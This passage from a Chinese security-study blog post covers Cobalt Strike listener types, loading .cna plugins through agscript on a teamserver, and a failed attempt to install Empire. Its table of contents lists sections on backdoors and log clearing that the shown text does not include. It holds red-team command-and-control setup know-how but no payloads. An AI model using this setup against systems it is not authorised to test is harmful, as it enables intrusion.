class="line">HTTP Port(C2): C2监听的端⼝ 可以任意指定Host Rotation Strategy先不管</span><br><span class="line"></span><br><span class="line">内部的Listener</span><br><span class="line">Beacon DNS Beacon HTTP Beacon HTTPS Beacon TCP Beacon SMB</span><br><span class="line"></span><br><span class="line">外部的Listener</span><br><span class="line">Foreign HTTP Foreign HTTPS</span><br><span class="line">External</span><br><span class="line">External C2</span><br><span class="line">Beacon为内置的Listener，即在⽬标主机执⾏相应的payload，获取shell到CS上；其中包含DNS、HTTP、 HTTPS、SMB。</span><br></pre></td></tr></table></figure>
<p>加载本地插件<code>.cna</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">emm就是汉化版就很nice</span><br><span class="line">本地加载</span><br><span class="line">Script Manager -&gt; Load</span><br><span class="line">插件的使用就是有shell弹回来以后右键使用。</span><br></pre></td></tr></table></figure>
<h4 id="服务端加载"><a href="#服务端加载" class="headerlink" title="服务端加载"></a><strong>服务端加载</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">加载方法：</span><br><span class="line">CobaltStrike服务器端有个 agscript⽂件，他是⽤来在服务器端运⾏cna插件⽂件的。</span><br><span class="line">agscript用法</span><br><span class="line">在服务端执行如下命令（避免与teamserver运行的产生的nohup.out冲突）</span><br><span class="line">nohup .&#x2F;agscript cs的ip cs的端口 任意用户名 password  插件路径 &gt;&gt; nohup1.out &amp;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/02/25/mfls5ObdHIZeoSJ.png" alt="image-20220225204514198"></p>
<p>关于我华为云服务器终于安装好外网teamserver！</p>
<p>centos8全线崩溃，说是不提供服务了喔，然后我又找了一些办法， 结果直接整到镜像损坏，无奈只好重装一个centos7.6的，不错子，完美，按照下面教程就好，最好再装一个<code>mobaXterm</code>，可以直接传文件，good！</p>
<p><a href="https://www.cxymm.net/article/qq89115156/112385723" target="_blank" rel="noopener">CentOS 7.6 搭建 cobalt strike 教程_king 丶 - 程序员秘密_centos 安装 cobaltstrike - 程序员秘密 (cxymm.net)</a></p>
<p>搞了个后台在线，不错子</p>
<p><img src="https://s2.loli.net/2022/02/25/4t3gbDjnyGd1u8S.png" alt="image-20220225224601633"></p>
<p><img src="https://s2.loli.net/2022/02/25/uBghVS7mfc64NtK.png" alt="image-20220225224757032"></p>
<p>可以继续往下走了</p>
<h4 id="对于受害机器的操作"><a href="#对于受害机器的操作" class="headerlink" title="对于受害机器的操作"></a>对于受害机器的操作</h4><p>这里太抽象啦，等我打一下</p>
<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>安装遇到最大的问题就是python的依赖问题，kali里面环境有点复杂，我出来wsl装，目前还没有安装成功，现在最接近的一步是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 .&#x2F;empire </span><br><span class="line">然后回显，缺少 flask，但是怎么重装flask都是不，我真的会谢</span><br><span class="line">所以现在就是没办法，这个是基于 python2的依赖</span><br></pre></td></tr></table></figure>
<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;0-UpfCvUVzXZkTAEHHrdhQ  -msf</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;TDN01K0-ctKpVt_LkjJiaA  -mimipenguin</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wszme&#x2F;p&#x2F;10045530.html</span><br></pre></td></tr></table></figure>

                
                <hr>
                <!-- Pager -->
                <ul class="pager">
                    
                    <li class="previous">
                        <a href="/2022/03/06/pikachu/" data-toggle="tooltip" data-placement="top" title="pikachu">&larr; Previous Post</a>
                    </li>
                    
                    
                    <li class="next">
                        <a href="/2022/03/04/红日/" data-toggle="tooltip" data-placement="top" title="红日">Next Post &rarr;</a>
                    </li>
                    
                </ul>

                <!-- tip start -->
                

                
                <div class="comment_notes">
                    <p>
                        本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
                    </p>
                </div>
                
                <!-- tip end -->

                <!-- Music start-->
                
                
<link rel="stylesheet" href="/css/music-player/fonts/iconfont.css">


<link rel="stylesheet" href="/css/music-player/css/reset.css">


<link rel="stylesheet" href="/css/music-player/css/player.css">


<div class="music-player">
    <audio class="music-player__audio" ></audio>
    <div class="music-player__main">
        <div class="music-player__blur"></div>
        <div class="music-player__disc">
            <div class="music-player__image">
                <img width="100%" src="" alt="">
            </div>
            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
        </div>
        <div class="music-player__controls">
            <div class="music__info">
                <h3 class="music__info--title">...</h3>
                <p class="music__info--singer">...</p>
            </div>
            <div class="player-control">
                <div class="player-control__content">
                    <div class="player-control__btns">
                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
                    </div>
                    <div class="player-control__volume">
                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
                        <div class="control__volume--progress player_progress"></div>
                    </div>
                </div>
                <div class="player-control__content">
                    <div class="player__song--progress player_progress"></div>
                    <div class="player__song--timeProgess nowTime">00:00</div>
                    <div class="player__song--timeProgess totalTime">00:00</div>
                </div>
            </div>
        </div>
    </div>
</div>


<script src="/js/music-player/utill.js"></script>


<script src="/js/music-player/jquery.min.js"></script>

<!-- netease; qqkg -->
<!--
<script src="/js/music-player/player.js?library=config.music.library.js"></script>
-->
<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
                
                <!-- Music end -->

                <!-- Sharing -->
                
                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
                <!--  css & js -->
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
                
                <!-- Sharing -->

                <!-- gitment start -->
                
                <!-- gitment end -->

                <!-- 来必力City版安装代码 -->
                
                <!-- City版安装代码已完成 -->

                <!-- disqus comment start -->
                
                <!-- disqus comment end -->
            </div>
            
            <!-- Tabe of Content -->
            <!-- Table of Contents -->

    
      
        <aside id="sidebar">
          <div id="toc" class="toc-article">
          <strong class="toc-title">Contents</strong>
          
            
              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#内网中常见名词解释"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">内网中常见名词解释</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#工作组-Work-Group"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">工作组(Work Group)</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#域-Domain"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">域(Domain)</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#域控制器（Domain-Controller：DC）"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">域控制器（Domain Controller：DC）</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#父域和子域"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">父域和子域</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#域树"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">域树</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#域林"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">域林</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#活动目录（Active-Directory）"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">活动目录（Active Directory）</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DMZ-Demilitarized-zone"><span class="toc-nav-number">1.8.</span> <span class="toc-nav-text">DMZ(Demilitarized zone)</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#域内的各种权限"><span class="toc-nav-number">1.9.</span> <span class="toc-nav-text">域内的各种权限</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#组"><span class="toc-nav-number">1.9.1.</span> <span class="toc-nav-text">组</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#域本地组"><span class="toc-nav-number">1.9.1.1.</span> <span class="toc-nav-text">域本地组</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#全局组"><span class="toc-nav-number">1.9.1.2.</span> <span class="toc-nav-text">全局组</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#通用组"><span class="toc-nav-number">1.9.1.3.</span> <span class="toc-nav-text">通用组</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#A-G-DL-P-策略"><span class="toc-nav-number">1.9.2.</span> <span class="toc-nav-text">A-G-DL-P 策略</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#windows安全认证机制"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">windows安全认证机制</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#验证是什么？"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">验证是什么？</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#NTLM验证"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">NTLM验证</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#本地验证"><span class="toc-nav-number">2.2.1.</span> <span class="toc-nav-text">本地验证</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#网络验证"><span class="toc-nav-number">2.2.2.</span> <span class="toc-nav-text">网络验证</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#总结"><span class="toc-nav-number">2.2.3.</span> <span class="toc-nav-text">总结</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#参考"><span class="toc-nav-number">2.2.4.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#KERBEROS验证"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">KERBEROS验证</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Kerberos是什么呢？"><span class="toc-nav-number">2.3.1.</span> <span class="toc-nav-text">Kerberos是什么呢？</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#认证过程"><span class="toc-nav-number">2.3.2.</span> <span class="toc-nav-text">认证过程</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#总结-1"><span class="toc-nav-number">2.4.</span> <span class="toc-nav-text">总结</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#认证过程中防止伪造"><span class="toc-nav-number">2.4.1.</span> <span class="toc-nav-text">认证过程中防止伪造</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#总结-2"><span class="toc-nav-number">2.4.2.</span> <span class="toc-nav-text">总结</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#参考-1"><span class="toc-nav-number">2.4.3.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#NTML与Kerberors总结"><span class="toc-nav-number">2.5.</span> <span class="toc-nav-text">NTML与Kerberors总结</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#域前置"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">域前置</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#参考-2"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Windows（域工作组）-信息收集"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">Windows（域工作组） 信息收集</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#参考-3"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#windows信息搜集思路以及工具"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">windows信息搜集思路以及工具</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#信息搜集是什么？"><span class="toc-nav-number">5.1.</span> <span class="toc-nav-text">信息搜集是什么？</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#对象"><span class="toc-nav-number">5.2.</span> <span class="toc-nav-text">对象</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#网站操作类型识别"><span class="toc-nav-number">5.3.</span> <span class="toc-nav-text">网站操作类型识别</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#网站指纹识别工具"><span class="toc-nav-number">5.4.</span> <span class="toc-nav-text">网站指纹识别工具</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#目录扫描-敏感文件扫描"><span class="toc-nav-number">5.5.</span> <span class="toc-nav-text">目录扫描 &#x2F; 敏感文件扫描</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#IP-查询"><span class="toc-nav-number">5.6.</span> <span class="toc-nav-text">IP 查询</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#whois-查询"><span class="toc-nav-number">5.7.</span> <span class="toc-nav-text">whois 查询</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#子域名查询"><span class="toc-nav-number">5.8.</span> <span class="toc-nav-text">子域名查询</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#端口扫描"><span class="toc-nav-number">5.9.</span> <span class="toc-nav-text">端口扫描</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#常见端口"><span class="toc-nav-number">5.10.</span> <span class="toc-nav-text">常见端口</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#针对dns的搜集"><span class="toc-nav-number">5.11.</span> <span class="toc-nav-text">针对dns的搜集</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#NSLOOKUP"><span class="toc-nav-number">5.11.1.</span> <span class="toc-nav-text">NSLOOKUP</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#DIG"><span class="toc-nav-number">5.11.2.</span> <span class="toc-nav-text">DIG</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Linux信息搜集"><span class="toc-nav-number">5.12.</span> <span class="toc-nav-text">Linux信息搜集</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#获取内核，操作系统和设备信息"><span class="toc-nav-number">5.13.</span> <span class="toc-nav-text">获取内核，操作系统和设备信息</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#用户和组"><span class="toc-nav-number">5.14.</span> <span class="toc-nav-text">用户和组</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#用户和权限信息"><span class="toc-nav-number">5.15.</span> <span class="toc-nav-text">用户和权限信息</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#环境信息"><span class="toc-nav-number">5.16.</span> <span class="toc-nav-text">环境信息</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#有用的命令"><span class="toc-nav-number">5.17.</span> <span class="toc-nav-text">有用的命令</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#服务信息"><span class="toc-nav-number">5.18.</span> <span class="toc-nav-text">服务信息</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#作业和任务"><span class="toc-nav-number">5.19.</span> <span class="toc-nav-text">作业和任务</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#网络、路由和通信"><span class="toc-nav-number">5.20.</span> <span class="toc-nav-text">网络、路由和通信</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#软件信息"><span class="toc-nav-number">5.21.</span> <span class="toc-nav-text">软件信息</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#linux搜集流程参考"><span class="toc-nav-number">5.22.</span> <span class="toc-nav-text">linux搜集流程参考</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#前期"><span class="toc-nav-number">5.22.1.</span> <span class="toc-nav-text">前期</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#中期"><span class="toc-nav-number">5.22.2.</span> <span class="toc-nav-text">中期</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#后期"><span class="toc-nav-number">5.22.3.</span> <span class="toc-nav-text">后期</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-number">5.23.</span> <span class="toc-nav-text">参考链接</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#msf、empire等工具简单用法"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">msf、empire等工具简单用法</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#msf"><span class="toc-nav-number">6.1.</span> <span class="toc-nav-text">msf</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#检查虚拟机配置"><span class="toc-nav-number">6.1.1.</span> <span class="toc-nav-text">检查虚拟机配置</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#枚举配置"><span class="toc-nav-number">6.1.2.</span> <span class="toc-nav-text">枚举配置</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#枚举网络"><span class="toc-nav-number">6.1.3.</span> <span class="toc-nav-text">枚举网络</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#枚举保护"><span class="toc-nav-number">6.1.4.</span> <span class="toc-nav-text">枚举保护</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#枚举系统"><span class="toc-nav-number">6.1.5.</span> <span class="toc-nav-text">枚举系统</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#用户具体信息HISTORY"><span class="toc-nav-number">6.1.6.</span> <span class="toc-nav-text">用户具体信息HISTORY</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#mimipenguin"><span class="toc-nav-number">6.2.</span> <span class="toc-nav-text">mimipenguin</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CS"><span class="toc-nav-number">6.3.</span> <span class="toc-nav-text">CS</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#cs基础：配置teamserver"><span class="toc-nav-number">6.3.1.</span> <span class="toc-nav-text">cs基础：配置teamserver</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#msf生成后门，不一定要用cs的生成，但是谁又能拒绝一个自动化生成后门呢"><span class="toc-nav-number">6.3.2.</span> <span class="toc-nav-text">msf生成后门，不一定要用cs的生成，但是谁又能拒绝一个自动化生成后门呢</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#一些命令"><span class="toc-nav-number">6.3.3.</span> <span class="toc-nav-text">一些命令</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#常见生成格式"><span class="toc-nav-number">6.3.4.</span> <span class="toc-nav-text">常见生成格式</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#cs文件介绍"><span class="toc-nav-number">6.3.5.</span> <span class="toc-nav-text">cs文件介绍</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#目录"><span class="toc-nav-number">6.3.6.</span> <span class="toc-nav-text">目录</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#cs清除日志"><span class="toc-nav-number">6.3.7.</span> <span class="toc-nav-text">cs清除日志</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#最基本的就是创建监听器"><span class="toc-nav-number">6.3.8.</span> <span class="toc-nav-text">最基本的就是创建监听器</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#服务端加载"><span class="toc-nav-number">6.3.9.</span> <span class="toc-nav-text">服务端加载</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#对于受害机器的操作"><span class="toc-nav-number">6.3.10.</span> <span class="toc-nav-text">对于受害机器的操作</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Empire"><span class="toc-nav-number">6.4.</span> <span class="toc-nav-text">Empire</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#参考链接-1"><span class="toc-nav-number">6.5.</span> <span class="toc-nav-text">参考链接</span></a></li></ol></li></ol>
            
          
          </div>
        </aside>
      
    

                
            <!-- Sidebar Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container">

                <!-- Featured Tags -->
                
                <section>
                    <!-- no hr -->
                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
                    <div class="tags">
                       
                          <a class="tag" href="/tags/#内网" title="内网">内网</a>
                        
                    </div>
                </section>
                

                <!-- Friends Blog -->
                
                <hr>
                <h5>FRIENDS</h5>
                <ul class="list-inline">

                    
                        <li><a href="http://na0h.cn/" target="_blank">间隔</a></li>
                    
                        <li><a href="https://hututu-w.github.io/" target="_blank">冰洁</a></li>
                    
                        <li><a href="https://gutoom.github.io/" target="_blank">Master_Zhang</a></li>
                    
                        <li><a href="https://saltyfishyjk.github.io/" target="_blank">saltyfishyjk</a></li>
                    
                        <li><a href="http://lyxx.link/" target="_blank">林会安全</a></li>
                    
                </ul>
                
            </div>
        </div>
    </div>
</article>




<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script>
    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
        anchors.options = {
          visible: 'hover',
          placement: 'left',
          icon: 'ℬ'
        };
        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
    })
</script>


<style  type="text/css">
    /* place left on bigger screen */
    @media all and (min-width: 800px) {
        .anchorjs-link{
            position: absolute;
            left: -0.75em;
            font-size: 1.1em;
            margin-top : -0.1em;
        }
    }
</style>



    <!-- Footer -->
    <!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">

                
                    <li>
                        <a target="_blank"  href="https://github.com/wxx0105">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                

                

                

                

                

                

                

                </ul>
                <p class="copyright text-muted">
                    Copyright &copy; wx_x 2022 
                    <br>
                    Powered by 
                    <a href="https://github.com/dusign/hexo-theme-snail">
                        <i>hexo-theme-snail</i>
                    </a> | 
                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
                        width="100px" height="20px"
                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
                    </iframe>
                </p>
            </div>
        </div>
    </div>

</footer>

<!-- jQuery -->

<script src="/js/jquery.min.js"></script>


<!-- Bootstrap Core JavaScript -->

<script src="/js/bootstrap.min.js"></script>


<!-- Custom Theme JavaScript -->

<script src="/js/hux-blog.min.js"></script>


<!-- Search -->

<script src="/js/search.js"></script>


<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>


<!-- jquery.tagcloud.js -->
<script>
    // only load tagcloud.js in tag.html
    if($('#tag_cloud').length !== 0){
        async("https://github.com/wxx0105/wxx0105.github.io/js/jquery.tagcloud.js",function(){
            $.fn.tagcloud.defaults = {
                //size: {start: 1, end: 1, unit: 'em'},
                color: {start: '#bbbbee', end: '#0085a1'},
            };
            $('#tag_cloud a').tagcloud();
        })
    }
</script>

<!--fastClick.js -->
<script>
    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
        var $nav = document.querySelector("nav");
        if($nav) FastClick.attach($nav);
    })
</script>


<!-- Google Analytics -->


<script>
    // dynamic User by Hux
    var _gaId = 'UA-XXXXXXXX-X';
    var _gaDomain = 'yoursite';

    // Originial
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', _gaId, _gaDomain);
    ga('send', 'pageview');
</script>




<!-- Baidu Tongji -->


<!-- Search -->

    <script type="text/javascript">      
        var search_path = "search.xml";
        if (search_path.length == 0) {
            search_path = "search.xml";
        }
    var path = "/" + search_path;
    searchFunc(path, 'local-search-input', 'local-search-result');
    </script>


<!-- busuanzi -->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






	<a id="rocket" href="#top" class=""></a>
	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>

    
        <!-- background effects line -->
        

        
            <script type="text/javascript" src="/js/mouse-click.js" content='[&quot;🌱&quot;,&quot;just do it wxx&quot;,&quot;🍀&quot;,&quot;🍂&quot;,&quot;🌈&quot;,&quot;🧿&quot;,&quot;🍁&quot;,&quot;🍇&quot;,&quot;🍍&quot;,&quot;🕌&quot;,&quot;⛩️&quot;]' color='[&quot;rgb(121,93,179)&quot; ,&quot;rgb(76,180,231)&quot; ,&quot;rgb(184,90,154)&quot;]'></script>
        

        <!-- background effects end -->
    

    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
    
        <script src="/js/ribbonDynamic.js"></script>
    
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>

</html>
